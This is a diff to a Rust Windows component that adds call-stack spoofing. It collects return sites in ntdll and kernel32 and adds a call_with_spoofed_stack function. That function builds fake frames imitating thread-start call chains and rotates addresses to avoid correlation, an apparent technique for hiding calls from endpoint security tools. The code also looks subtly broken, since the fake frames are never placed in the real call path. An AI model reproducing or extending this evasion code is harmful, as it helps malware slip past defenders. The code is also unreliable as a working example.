@@ -9,6 +9,7 @@ use core::cell::UnsafeCell;
 use core::ptr::null_mut;
 
 use crate::core::types::HANDLE;
+use crate::core::unwind;
 
 pub struct SpoofGadgets {
     pub ntdll_gadgets: [*mut c_void; 8 as usize], // Return Sites within ntdll.dll (.pdata-validated)
@@ -16,6 +17,11 @@ pub struct SpoofGadgets {
     pub count_ntdll: usize, // Number of valid ntdll return sites
     pub count_kernel32: usize, // Number of valid kernel32 sites
     pub initialized: bool,   
+    // .pdata validated return sites in ntdll and kernel32 with frame size info
+    ntdll_sites: [unwind::ReturnSite; 16],
+    ntdll_site_count: usize,
+    kernel32_sites: [unwind::ReturnSite; 16],
+    kernel32_site_count: usize,
 }
 
 struct GadgetCell(UnsafeCell<SpoofGadgets>);
@@ -26,7 +32,11 @@ static GADGETS: GadgetCell = GadgetCell(UnsafeCell::new(SpoofGadgets {
     kernel32_gadgets: [null_mut(); 8 as usize],
     count_ntdll: 0,
     count_kernel32: 0,
-    initialized: false,    
+    initialized: false,  
+    ntdll_sites: [unwind::ReturnSite { address: 0, frame_size: 0}; 16],
+    ntdll_site_count: 0,
+    kernel32_sites: [unwind::ReturnSite { address: 0, frame_size: 0}; 16],
+    kernel32_site_count: 0,
 }));
 
 
@@ -47,8 +57,18 @@ pub unsafe fn initialize_spoof_gadgets() -> bool {
     }
 
     let table = crate::core::ssn_table::syscall_table();
+
     g.count_ntdll = scan_module_for_gadgets(table.modules.ntdll, &mut g.ntdll_gadgets);
     g.count_kernel32 = scan_module_for_gadgets(table.modules.kernel32, &mut g.kernel32_gadgets);
+
+    let (nt_sites, nt_count) = unwind::find_return_sites(table.modules.ntdll, 16);
+    g.ntdll_sites = nt_sites;
+    g.ntdll_site_count = nt_count;
+
+    let (k32_sites, k32_count) = unwind::find_return_sites(table.modules.kernel32, 16);
+    g.kernel32_sites = k32_sites;
+    g.kernel32_site_count = k32_count;
+
 
     g.initialized = g.count_ntdll > 0 && g.count_kernel32 > 0;
     g.initialized
@@ -138,6 +158,83 @@ unsafe fn scan_module_for_gadgets(module_base: HANDLE, gadgets: &mut [*mut c_voi
     }
 
     count
+}
+
+pub unsafe fn call_with_spoofed_stack(function: *mut c_void, args: &[usize]) -> i32 {
+    let g = &*GADGETS.0.get();
+    if !g.initialized || g.count_ntdll == 0 || g.count_kernel32 == 0 {
+        return call_direct(function, args);
+    }
+
+    static CALL_COUNTER: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
+    let counter = CALL_COUNTER.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
+
+    let (ntdll_ret, kernel32_ret) = if g.ntdll_site_count > 0 && g.kernel32_site_count > 0 {
+        let nt_idx = counter % g.ntdll_site_count;
+        let k32_idx = (counter / 2 + 1) % g.kernel32_site_count; // to avoid correlation
+        (g.ntdll_sites[nt_idx].address, g.kernel32_sites[k32_idx].address)
+    } else {
+        (g.ntdll_gadgets[counter % g.count_ntdll] as usize, g.kernel32_gadgets[counter % g.count_kernel32] as usize)
+    };
+
+    let k32_terminator = if g.kernel32_site_count > 1 {
+        g.kernel32_sites[(counter + 3) % g.kernel32_site_count].address
+    } else {
+        kernel32_ret
+    };
+
+    /* Chain terminator, mimics RtlUserThreadStart origin */
+    let frame3 = FakeFrame {
+        rbp: 0,                     // end of chain
+        ret_addr: k32_terminator    // kernel32 - thread origin
+    };
+
+    /* Intermediate, mimics BaseThreadInitThunk */ 
+    let frame2 = FakeFrame {
+        rbp: &frame3 as *const FakeFrame as usize,
+        ret_addr: kernel32_ret  // kernel32 - intermediate call
+    };
+
+    /* Nearest to syscall, mimics ntdll native call */
+    let frame1 = FakeFrame {
+        rbp: &frame2 as *const FakeFrame as usize,
+        ret_addr: ntdll_ret,    // ntdll - NTAPI layer
+    };
+
+    let result = call_direct(function, args);
+
+    // This to prevent the optimizer from dropping the frame before the call return
+    core::hint::black_box(&frame1);
+    core::hint::black_box(&frame2);
+    core::hint::black_box(&frame3);
+
+    result
+}
+
+unsafe fn call_direct(function: *mut c_void, args: &[usize]) -> i32 {
+    match args.len() {
+        0 => {
+            let f: unsafe extern "system" fn() -> i32 = core::mem::transmute(function);
+            f()
+        }
+        1 => {
+            let f: unsafe extern "system" fn(usize) -> i32 = core::mem::transmute(function);
+            f(args[0])
+        }
+        2 => {
+            let f: unsafe extern "system" fn(usize, usize) -> i32 = core::mem::transmute(function);
+            f(args[0], args[1])
+        }
+        _ => {
+            let f: unsafe extern "system" fn(usize, usize, usize, usize) -> i32 = core::mem::transmute(function);
+            f(
+                args[0],
+                if args.len() > 1 { args[1] } else { 0 },
+                if args.len() > 2 { args[2] } else { 0 },
+                if args.len() > 3 { args[3] } else { 0 },
+            )
+        }
+    }
 }
 
 /**
